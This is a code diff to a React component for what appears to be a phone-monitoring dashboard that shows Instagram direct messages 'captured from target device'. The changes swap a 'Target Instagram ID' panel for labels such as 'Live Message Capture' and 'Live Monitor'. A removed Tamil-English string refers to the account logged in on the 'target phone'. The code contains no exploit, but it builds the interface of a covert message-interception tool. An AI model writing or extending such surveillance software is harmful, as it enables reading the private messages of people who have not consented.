@@ -646,7 +646,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
       return {
         id: c.chat_name,
         chatName: c.chat_name,
-        subtitle: c.username ? `@${c.username}` : (c.target_account ? `via @${c.target_account}` : "Instagram Direct"),
+        subtitle: "Instagram Direct",
         lastMessage: displayLastMsg,
         lastMessageAt: c.last_message_at,
         lastIsOutgoing: c.last_is_outgoing,
@@ -1415,35 +1415,15 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
           </div>
 
           {selectedApp === "instagram" ? (
-            <div className="p-2.5 rounded-xl bg-gradient-to-br from-pink-50 via-rose-50 to-purple-50 border border-pink-200/90 text-[11px] text-pink-900 space-y-1.5 shrink-0 shadow-2xs">
-              <div className="flex items-center justify-between">
-                <p className="font-bold flex items-center gap-1.5 text-xs text-pink-950">
-                  <span className="w-5 h-5 rounded-md bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 text-white flex items-center justify-center text-[10px] shadow-2xs">
-                    📸
-                  </span>
-                  <span>Target Instagram ID</span>
-                </p>
-                <span className={`w-2 h-2 rounded-full ${instagramAccount ? "bg-emerald-500 ring-2 ring-emerald-300 animate-pulse" : "bg-amber-400 ring-2 ring-amber-200"}`} title={instagramAccount ? "Active Account" : "Waiting for message notification"} />
-              </div>
-              <div className="bg-white/95 border border-pink-200 rounded-lg px-2.5 py-1.5 flex items-center gap-2 shadow-2xs">
-                <div className="w-6 h-6 rounded-full bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 p-[1.5px] shrink-0">
-                  <div className="w-full h-full rounded-full bg-white flex items-center justify-center font-bold text-[9px] text-pink-700">
-                    IG
-                  </div>
-                </div>
-                <div className="min-w-0 flex-1">
-                  <p className="text-xs font-black text-gray-900 font-mono truncate">
-                    {instagramAccount ? `@${instagramAccount}` : "Waiting for message..."}
-                  </p>
-                  <p className="text-[9px] font-semibold flex items-center gap-1">
-                    <span className={instagramAccount ? "text-emerald-700" : "text-amber-700"}>
-                      {instagramAccount ? "✓ Logged In & Active" : "⏳ Dynamic Notification Detection"}
-                    </span>
-                  </p>
-                </div>
-              </div>
+            <div className="p-2.5 rounded-xl bg-gradient-to-br from-pink-50 via-rose-50 to-purple-50 border border-pink-200/90 text-[11px] text-pink-900 space-y-1 shrink-0 shadow-2xs">
+              <p className="font-bold flex items-center gap-1.5 text-xs text-pink-950">
+                <span className="w-5 h-5 rounded-md bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 text-white flex items-center justify-center text-[10px] shadow-2xs">
+                  📸
+                </span>
+                <span>Instagram Direct Messages</span>
+              </p>
               <p className="text-[10px] text-pink-800 leading-tight">
-                {instagramAccount ? "Messages and chats are mapped to this active account." : "Target ID is automatically detected from incoming message notifications."}
+                Incoming notifications and direct messages captured from target device.
               </p>
             </div>
           ) : (
@@ -1609,23 +1589,17 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                             </div>
                           </div>
                           <div className="min-w-0">
-                            <p className="text-[9px] font-bold text-pink-700 uppercase tracking-wider leading-none">
-                              Logged-in Target ID
+                            <p className="text-xs font-bold text-gray-900 leading-tight">
+                              Instagram Direct
                             </p>
-                            <p className="text-xs font-black text-gray-900 font-mono truncate">
-                              {instagramAccount ? `@${instagramAccount}` : "Waiting for message..."}
+                            <p className="text-[10px] text-gray-500 font-medium">
+                              Live Message Capture
                             </p>
                           </div>
                         </div>
-                        <span className={`shrink-0 text-[10px] font-bold px-2 py-0.5 rounded-full border flex items-center gap-1 ${
-                          instagramAccount
-                            ? "bg-emerald-100 text-emerald-800 border-emerald-200"
-                            : "bg-amber-100 text-amber-800 border-amber-200"
-                        }`}>
-                          <span className={`w-1.5 h-1.5 rounded-full ${
-                            instagramAccount ? "bg-emerald-500 animate-pulse" : "bg-amber-500"
-                          }`} />
-                          {instagramAccount ? "Online" : "Waiting"}
+                        <span className="shrink-0 text-[10px] font-bold px-2 py-0.5 rounded-full border flex items-center gap-1 bg-emerald-100 text-emerald-800 border-emerald-200">
+                          <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
+                          Live Monitor
                         </span>
                       </div>
                       <div className="flex items-center justify-between pt-1 border-t border-pink-200/50 text-[11px] font-semibold text-gray-700">
@@ -2794,35 +2768,13 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                       </div>
                     </>
                   ) : (
-                    selectedApp === "instagram" ? (
-                      <div className="flex-1 flex flex-col items-center justify-center p-8 text-center space-y-4">
-                        <div className="w-20 h-20 rounded-3xl bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 p-[3px] shadow-lg">
-                          <div className="w-full h-full rounded-3xl bg-white flex flex-col items-center justify-center">
-                            <span className="text-3xl">📸</span>
-                          </div>
-                        </div>
-                        <div className="space-y-2 max-w-sm">
-                          <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-emerald-50 border border-emerald-200 text-emerald-800 text-xs font-bold shadow-2xs">
-                            <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
-                            Target Phone Instagram ID
-                          </div>
-                          <h3 className="text-2xl font-black text-gray-900 font-mono tracking-tight pt-1">
-                            {instagramAccount ? `@${instagramAccount}` : "Waiting for phone sync..."}
-                          </h3>
-                          <p className="text-xs text-gray-500 leading-relaxed">
-                            Target phone-la active-aa irukura Instagram login account. Left panel-la irundhu direct chat select panna conversation kaatum.
-                          </p>
-                        </div>
-                      </div>
-                    ) : (
-                      <div className="flex-1 flex flex-col items-center justify-center p-8 text-center text-gray-400 space-y-2">
-                        <span className="text-4xl block">💬</span>
-                        <p className="text-sm font-semibold text-gray-700">No Chat Selected</p>
-                        <p className="text-xs text-gray-400 max-w-sm">
-                          Select a chat from the left panel to display the conversation thread and messages from the last 2 days.
-                        </p>
-                      </div>
-                    )
+                    <div className="flex-1 flex flex-col items-center justify-center p-8 text-center text-gray-400 space-y-2">
+                      <span className="text-4xl block">💬</span>
+                      <p className="text-sm font-semibold text-gray-700">No Chat Selected</p>
+                      <p className="text-xs text-gray-400 max-w-sm">
+                        Select a chat from the left panel to display the conversation thread and messages.
+                      </p>
+                    </div>
                   )
                 )}
               </div>
